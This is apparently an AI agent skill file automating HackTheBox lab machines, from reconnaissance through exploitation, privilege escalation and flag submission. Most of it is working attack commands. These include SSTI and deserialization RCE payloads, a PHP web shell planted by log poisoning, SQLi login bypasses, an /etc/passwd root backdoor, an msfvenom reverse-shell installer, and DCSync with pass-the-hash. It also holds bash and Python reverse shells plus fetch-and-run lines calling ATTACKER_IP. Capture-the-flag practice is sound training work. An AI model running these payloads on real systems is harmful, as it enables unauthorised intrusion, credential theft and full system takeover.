---
name: hackthebox
description: HackTheBox automation — machine info via API, machine-type strategy, enumeration checklists, foothold patterns, Linux/Windows/AD privesc decision trees, writeup template, flag submission
allowed-tools: [Bash, Read, Write]
---

# HackTheBox

Full engagement workflow: API recon → machine-type strategy → enumeration → foothold → privilege escalation → flag capture → submission → writeup.

## Credentials

```bash
eval $(python3 tools/env-reader.py HTB_TOKEN)
# HTB_TOKEN = API token from https://app.hackthebox.com/profile/settings
```

---

## Phase 0 — Machine Info via HTB API

```bash
HTB_TOKEN=$(python3 tools/env-reader.py HTB_TOKEN | cut -d= -f2)
AUTH="Authorization: Bearer $HTB_TOKEN"

# List active machines
curl -s "https://www.hackthebox.com/api/v4/machine/active" \
  -H "$AUTH" | jq '[.info[] | {id:.id, name:.name, os:.os, difficulty:.difficultyText, points:.points, release:.release}]'

# Get specific machine by name
MACHINE_NAME="MachineName"
MACHINE_ID=$(curl -s "https://www.hackthebox.com/api/v4/machine/active" \
  -H "$AUTH" | jq -r --arg n "$MACHINE_NAME" '.info[] | select(.name == $n) | .id')

# Full machine profile
curl -s "https://www.hackthebox.com/api/v4/machine/profile/$MACHINE_ID" \
  -H "$AUTH" | jq '{
    id:           .info.id,
    name:         .info.name,
    os:           .info.os,
    difficulty:   .info.difficultyText,
    points:       .info.points,
    rating:       .info.star,
    user_owns:    .info.authUserInUserOwns,
    root_owns:    .info.authUserInRootOwns,
    user_blood:   .info.firstUserBloodTime,
    root_blood:   .info.firstRootBloodTime,
    release_date: .info.release,
    maker:        .info.maker.name
  }' | tee "$OUTPUT_DIR/artifacts/htb-machine.json"

# Save target IP (from spawned machine)
TARGET_IP=$(curl -s "https://www.hackthebox.com/api/v4/machine/active" \
  -H "$AUTH" | jq -r --arg id "$MACHINE_ID" '.info[] | select(.id == ($id|tonumber)) | .ip // empty')
echo "TARGET_IP=$TARGET_IP"
```

---

## Phase 1 — VPN Connection

```bash
# Download VPN pack (lab = starting point machines, competitive = competitive)
curl -s "https://www.hackthebox.com/api/v4/connections/servers/options" \
  -H "$AUTH" | jq '.servers[] | select(.type == "labs") | {id:.id, hostname:.hostname}'

# Connect (place .ovpn in OUTPUT_DIR/tools/)
sudo openvpn --config "$OUTPUT_DIR/tools/htb.ovpn" --daemon \
  --log "$OUTPUT_DIR/logs/vpn.log"
sleep 5

# Verify tunnel
ip addr show tun0 | grep "inet " || { echo "[!] VPN failed"; exit 1; }
echo "[+] VPN connected: $(ip addr show tun0 | grep -oP '(?<=inet )[^/]+')"
```

---

## Phase 2 — Machine-Type Detection & Strategy

```bash
TARGET_IP="10.10.11.XXX"

# Initial scan to determine machine type
nmap -sV -sC -T4 --open -p- "$TARGET_IP" -oN "$OUTPUT_DIR/recon/nmap-full.txt" &
nmap -sV -sC -T4 --open --top-ports 1000 "$TARGET_IP" -oN "$OUTPUT_DIR/recon/nmap-fast.txt"

# Parse open ports to select strategy
PORTS=$(grep "^[0-9]" "$OUTPUT_DIR/recon/nmap-fast.txt" | awk '{print $1}' | cut -d/ -f1 | tr '\n' ' ')
echo "Open ports: $PORTS"
```

**Strategy selector:**

| Ports / Services | Machine Type | First Move |
|---|---|---|
| 80/443 only | Web | Gobuster → source code → SSTI/SQLi/upload |
| 22 + 80/443 | Web+Linux | Web foothold → SSH |
| 22 + custom port | Linux service | Identify service → searchsploit CVE |
| 445 + 5985 | Windows | SMB enum → WinRM if creds found |
| 88 + 389 + 445 | Active Directory | BloodHound → Kerberos attacks |
| 3306/5432 exposed | DB direct access | Try default creds, dump |
| 8080/8443/8888 | Web app / API | Admin panel, API docs |

---

## Phase 3 — Enumeration Checklists

### Web Enumeration

```bash
TARGET="http://$TARGET_IP"   # or https://

# Directory brute-force
gobuster dir -u "$TARGET" \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt \
  -x php,txt,html,bak,old,zip,tar.gz,config,json,xml \
  -o "$OUTPUT_DIR/recon/gobuster.txt" -t 40

ffuf -u "$TARGET/FUZZ" \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt \
  -mc 200,301,302,307,403 -fc 404 \
  -o "$OUTPUT_DIR/recon/ffuf.json" -of json

# Tech stack fingerprinting
whatweb "$TARGET" -v | tee "$OUTPUT_DIR/recon/whatweb.txt"
curl -sI "$TARGET" | tee "$OUTPUT_DIR/recon/headers.txt"

# Check robots.txt, sitemap, .git, .env
for path in robots.txt sitemap.xml .git/HEAD .env .htaccess backup.zip config.php web.config; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET/$path")
  [ "$code" != "404" ] && echo "[$code] $TARGET/$path"
done | tee "$OUTPUT_DIR/recon/sensitive-paths.txt"

# Parameter discovery (once endpoints found)
ffuf -u "$TARGET/api/FUZZ" \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,400,401,403,405 -o "$OUTPUT_DIR/recon/api-ffuf.json" -of json
```

### Linux Enumeration (post-foothold)

```bash
# System info
uname -a && cat /etc/os-release && hostname && id && whoami

# Network
ip addr && ss -tulnp && cat /etc/hosts

# Users and home directories
cat /etc/passwd | grep -v nologin | grep -v false
ls -la /home/
find /home -name "*.txt" -o -name "*.key" -o -name "*.cred" 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | head -20

# SUID binaries
find / -perm -4000 -type f 2>/dev/null | tee "$OUTPUT_DIR/recon/suid.txt"

# Sudo permissions
sudo -l 2>/dev/null

# Cron jobs
cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null
# Monitor for root cron jobs
pspy64 2>/dev/null &   # upload pspy to target first

# Running services and processes
ps auxf
ss -tulnp

# Installed software versions (for CVE hunting)
dpkg -l 2>/dev/null | head -30
rpm -qa 2>/dev/null | head -30
pip3 list 2>/dev/null

# Interesting files
find /opt /srv /var/www /var/backups -type f 2>/dev/null | head -30
cat /var/www/html/*.php 2>/dev/null | grep -E "password|passwd|db_pass|secret|key" | head -20
```

### Windows Enumeration (post-foothold)

```bash
# Via evil-winrm or shell
# System info
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
whoami /all
net user
net localgroup administrators

# Network
ipconfig /all && netstat -ano

# Interesting files
dir C:\Users\*\Desktop\*.txt 2>nul
dir C:\Users\*\Documents\*.txt 2>nul
dir C:\ /a /s 2>nul | findstr /i "password secret cred"

# Services (for unquoted path / writable binary)
sc query type= all state= all
wmic service get Name,PathName,StartMode,StartName | findstr /v "C:\Windows"

# Scheduled tasks
schtasks /query /fo LIST /v 2>nul | findstr /i "task\|run\|status"

# Registry autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul

# Stored credentials
cmdkey /list

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
```

### Active Directory Enumeration

```bash
DOMAIN="domain.htb"
DC_IP="10.10.10.X"
USER="username"
PASS="password"

# BloodHound collection
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" \
  -ns "$DC_IP" -c All \
  --zip -o "$OUTPUT_DIR/artifacts/bloodhound/"

# Start BloodHound
sudo neo4j start && bloodhound &
# Import zip via GUI → Pathfinding → Shortest path to Domain Admin

# Manual enumeration
ldapsearch -x -H "ldap://$DC_IP" -b "DC=${DOMAIN//./',DC='}" \
  -D "$USER@$DOMAIN" -w "$PASS" "(objectClass=user)" sAMAccountName memberOf \
  | tee "$OUTPUT_DIR/recon/ldap-users.txt"

# Kerberoastable accounts (SPNs)
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" \
  -outputfile "$OUTPUT_DIR/artifacts/kerberoast.txt"
hashcat -m 13100 "$OUTPUT_DIR/artifacts/kerberoast.txt" /usr/share/wordlists/rockyou.txt

# AS-REP Roasting (no pre-auth)
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC_IP" -no-pass \
  -usersfile "$OUTPUT_DIR/recon/users.txt" \
  -outputfile "$OUTPUT_DIR/artifacts/asrep.txt"
```

---

## Phase 4 — Common HTB Foothold Patterns

### SSTI (Server-Side Template Injection)

```bash
# Detection payloads (inject in any user-controlled field)
for payload in "{{7*7}}" "#{7*7}" "${7*7}" "<%=7*7%>" "{7*7}"; do
  result=$(curl -s "$TARGET/search?q=$payload")
  echo "$result" | grep -o "49" && echo "SSTI: $payload"
done

# Jinja2 RCE (Flask/Python)
curl -s "$TARGET/page?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"

# Twig RCE (PHP)
curl -s "$TARGET/render?template={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
```

### Deserialization

```bash
# PHP deserialization — check for unserialize() in source
# Generate payload with phpggc
phpggc Laravel/RCE1 system id > /tmp/payload.b64
curl -s -b "session=$(cat /tmp/payload.b64)" "$TARGET/"

# Java deserialization — check for serialized objects (aced 0005 in base64 = rO0AB)
echo "rO0AB" | base64 -d | xxd | head -1
# Generate with ysoserial
java -jar ysoserial.jar CommonsCollections6 "curl ATTACKER_IP:8080/shell.sh|bash" > /tmp/deser.ser
```

### SQL Injection

```bash
# Quick test — login bypass
curl -s -X POST "$TARGET/login" -d "username=admin'--&password=x"
curl -s -X POST "$TARGET/login" -d "username=' OR 1=1--&password=x"

# Automated extraction
sqlmap -u "$TARGET/page?id=1" --batch --dbs \
  --output-dir="$OUTPUT_DIR/tools/sqlmap/"
sqlmap -u "$TARGET/page?id=1" --batch -D target_db --dump \
  --output-dir="$OUTPUT_DIR/tools/sqlmap/"
```

### API Keys / Secrets in Source

```bash
# Check .git if exposed
git clone "http://$TARGET_IP/.git" "$OUTPUT_DIR/artifacts/git-dump/" 2>/dev/null || \
  python3 /opt/GitDumper/git-dumper.py "http://$TARGET_IP/" "$OUTPUT_DIR/artifacts/git-dump/"

# Search dumped source
grep -rE "api_key|password|secret|token|passwd|ACCESS_KEY|AWS_" \
  "$OUTPUT_DIR/artifacts/git-dump/" | grep -v ".git" \
  | tee "$OUTPUT_DIR/recon/secrets-in-source.txt"

# Check git log for removed secrets
cd "$OUTPUT_DIR/artifacts/git-dump/" && git log --oneline && git diff HEAD~5 HEAD

# Check .env / config files
curl -s "$TARGET/.env" | grep -E "=.{6,}"
curl -s "$TARGET/config.php"
curl -s "$TARGET/appsettings.json"
```

### Log Poisoning (LFI → RCE)

```bash
# Step 1: Confirm LFI
curl -s "$TARGET/page?file=../../../etc/passwd" | grep root

# Step 2: Poison log file (inject PHP into User-Agent)
curl -s "$TARGET/" -A "<?php system(\$_GET['cmd']); ?>"

# Step 3: Include poisoned log
curl -s "$TARGET/page?file=../../../var/log/apache2/access.log&cmd=id"

# Other log paths to try
for log in /var/log/auth.log /var/log/nginx/access.log /proc/self/environ \
           /var/mail/www-data /tmp/sess_PHPSESSIONID; do
  curl -s "$TARGET/page?file=$log" | head -5
done
```

---

## Phase 5 — Privilege Escalation

### Linux Privesc Decision Tree

```bash
# Run automated enumeration first
curl -s https://raw.githubusercontent.com/carlospolop/peass-ng/master/linPEAS/linpeas.sh > /tmp/lp.sh
chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/linpeas.out

# Then walk this decision tree manually:

# 1. sudo -l → NOPASSWD or wildcards?
sudo -l
# If "NOPASSWD: /usr/bin/vim" → sudo vim -c ':!/bin/bash'
# Consult: https://gtfobins.github.io/

# 2. SUID binaries → GTFOBins match?
find / -perm -4000 2>/dev/null | grep -v "^/proc"
# If /usr/bin/python3 → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 3. Writable cron script owned by root?
cat /etc/crontab
ls -la /etc/cron.d/
# pspy to catch short-interval tasks
pspy64 | grep -E "UID=0|root"

# 4. Capabilities
getcap -r / 2>/dev/null
# cap_setuid → python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
# cap_net_raw → tcpdump credentials in traffic

# 5. Writable /etc/passwd?
ls -la /etc/passwd
# If writable: echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd && su hacker

# 6. Docker / LXD group?
id | grep -E "docker|lxd"
# docker: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# lxd: lxd init → lxc image import → lxc launch → mount host fs

# 7. NFS no_root_squash?
cat /etc/exports | grep no_root_squash
# Mount from attacker, create SUID bash: cp /bin/bash /mnt/tmp/; chmod +s /mnt/tmp/bash

# 8. Kernel exploit (last resort)
uname -r
searchsploit linux kernel $(uname -r | cut -d- -f1)
```

### Windows Privesc Decision Tree

```bash
# Automated: upload winPEAS
evil-winrm -i $TARGET_IP -u user -p pass -e /opt/winpeas/
# inside evil-winrm: menu → Invoke-Binary winPEAS.exe

# Decision tree:

# 1. SeImpersonatePrivilege?
whoami /priv | findstr "SeImpersonate"
# → PrintSpoofer: .\PrintSpoofer64.exe -c "cmd /c whoami"
# → GodPotato:    .\GodPotato-NET4.exe -cmd "cmd /c whoami"
# → JuicyPotato (Server 2016/Win10 ≤1803): requires CLSID

# 2. AlwaysInstallElevated (both keys = 1)?
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f msi > priv.msi
# msiexec /quiet /qn /i priv.msi

# 3. Unquoted service path?
wmic service get Name,PathName,StartMode | findstr /i /v "C:\Windows\\" | findstr /i ".exe"
# Path: C:\Program Files\Vuln Service\service.exe → place at C:\Program.exe or C:\Program Files\Vuln.exe

# 4. Writable service binary?
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "svchost"') do @echo %a
# Check write permissions on binary → replace with reverse shell

# 5. SeBackupPrivilege?
whoami /priv | findstr "SeBackupPrivilege"
# Copy SAM + SYSTEM: reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM sys.bak
# Exfil → impacket-secretsdump -sam sam.bak -system sys.bak LOCAL

# 6. Autologon / stored credentials?
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
cmdkey /list
# Use found creds: runas /savecred /user:DOMAIN\admin cmd

# 7. Scheduled task writable action?
schtasks /query /fo LIST /v | findstr /i "task name\|run as user\|task to run"
icacls "C:\path\to\task\script.bat"  # writable? → replace content
```

### Active Directory Escalation

```bash
# From BloodHound — identify path to Domain Admin
# Common paths:
# GenericWrite/WriteDACL/ForceChangePassword on user → reset password → lateral move
# DCSync rights → impacket-secretsdump for all hashes
# Unconstrained delegation → PetitPotam / coerce auth → dump TGT
# ACL abuse → WriteDACL → add to Domain Admins

# DCSync (if you have DS-Replication permissions)
impacket-secretsdump "$DOMAIN/$USER:$PASS@$DC_IP" -just-dc \
  | tee "$OUTPUT_DIR/artifacts/dcsync.txt"

# Pass-the-Hash (from DCSync NTLM hash)
evil-winrm -i "$DC_IP" -u "Administrator" \
  -H "$(grep 'Administrator' "$OUTPUT_DIR/artifacts/dcsync.txt" | awk -F: '{print $4}')"
```

---

## Phase 6 — Flag Capture & Evidence

```bash
# User flag
USER_FLAG=$(cat /home/*/user.txt 2>/dev/null || find /home -name user.txt -exec cat {} \;)
echo "[+] User flag: $USER_FLAG"

# Root flag
ROOT_FLAG=$(cat /root/root.txt 2>/dev/null)
echo "[+] Root flag: $ROOT_FLAG"

# Save with evidence
{
  echo "=== USER FLAG ==="
  echo "$USER_FLAG"
  echo "=== ROOT FLAG ==="
  echo "$ROOT_FLAG"
  echo "=== WHOAMI AT ROOT ==="
  whoami && id
} | tee "$OUTPUT_DIR/artifacts/flags.txt"

# Screenshot proof (from attacker machine via Playwright or scrot)
# Use browser_screenshot MCP tool if available
```

---

## Phase 7 — Flag Submission via HTB API

```bash
HTB_TOKEN=$(python3 tools/env-reader.py HTB_TOKEN | cut -d= -f2)
MACHINE_ID=$(jq -r '.id' "$OUTPUT_DIR/artifacts/htb-machine.json")

submit_flag() {
  local flag="$1"
  local difficulty="${2:-50}"   # 10=easy, 50=medium, 100=hard (self-rated)
  python3 - <<PYEOF
import urllib.request, json

TOKEN     = "$HTB_TOKEN"
FLAG      = "$flag"
MACHINE_ID = $MACHINE_ID

data = json.dumps({"id": MACHINE_ID, "flag": FLAG.strip(), "difficulty": $difficulty}).encode()
req  = urllib.request.Request(
    "https://www.hackthebox.com/api/v4/machine/own",
    data    = data,
    headers = {
        "Authorization": f"Bearer {TOKEN}",
        "Content-Type":  "application/json",
        "Accept":        "application/json",
    }
)
try:
    with urllib.request.urlopen(req) as r:
        result = json.load(r)
        print(json.dumps(result, indent=2))
except urllib.error.HTTPError as e:
    print(f"HTTP {e.code}: {e.read().decode()}")
PYEOF
}

# Submit user flag
submit_flag "$USER_FLAG" 50
# Submit root flag
submit_flag "$ROOT_FLAG" 50

# Verify owns via API
curl -s "https://www.hackthebox.com/api/v4/machine/profile/$MACHINE_ID" \
  -H "Authorization: Bearer $HTB_TOKEN" | jq '{
    user_own: .info.authUserInUserOwns,
    root_own: .info.authUserInRootOwns
  }'
```

---

## Phase 8 — Writeup Template

Save to `OUTPUT_DIR/reports/writeup.md`:

```markdown
# HTB: [Machine Name] — Writeup

**OS:** Linux / Windows  
**Difficulty:** Easy / Medium / Hard  
**Release Date:** YYYY-MM-DD  
**IP:** 10.10.11.XXX  

---

## Summary

[2–3 sentences describing the attack path at a high level]

Example: Initial access was achieved via a SSTI vulnerability in the Flask template
engine exposed through the search parameter. Privilege escalation leveraged a
misconfigured sudo rule allowing execution of `/usr/bin/python3` as root.

---

## Enumeration

### Nmap
```
[paste key nmap output]
```

### Web Discovery
- Found: `/admin` (401), `/backup.zip` (200), `/api/v1/users` (200)
- Technology: Flask 2.1, Python 3.10, Nginx

---

## Foothold

**Vector:** [SSTI / SQLi / File Upload / CVE-XXXX / etc.]

[Step-by-step with exact commands and output]

1. Identified template injection point at `/?name=`
2. Confirmed with payload `{{7*7}}` → response: `49`
3. Extracted /etc/passwd: `{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}`
4. Established reverse shell: [payload + listener command]

**User flag:** `[REDACTED]`

---

## Privilege Escalation

**Vector:** [sudo misconfiguration / SUID / SeImpersonate / etc.]

[Step-by-step]

1. `sudo -l` revealed `NOPASSWD: /usr/bin/python3`
2. Executed: `sudo python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
3. Got root shell, read `/root/root.txt`

**Root flag:** `[REDACTED]`

---

## Lessons Learned

- [What made this machine interesting / unusual]
- [New technique learned]
- [Tools that were useful / useless]

---

## Commands Reference

```bash
# Key commands in order
nmap -sV -sC ...
gobuster dir ...
curl -s "...?name={{7*7}}"
nc -lvnp 4444
sudo python3 -c '...'
```
```

---

## Tools Quick Reference

```bash
# Web
gobuster, ffuf, feroxbuster, nikto, whatweb, sqlmap, dalfox

# File transfer (from attacker to target)
python3 -m http.server 8080         # attacker serves files
wget http://ATTACKER_IP:8080/tool   # target downloads
curl -o /tmp/tool http://ATTACKER_IP:8080/tool

# Reverse shells
# Bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# Listener
nc -lvnp 4444
# Stabilise shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then: Ctrl+Z, stty raw -echo; fg, reset

# AD
evil-winrm, impacket suite, bloodhound-python, crackmapexec, kerbrute
chisel, ligolo-ng (pivoting)
```
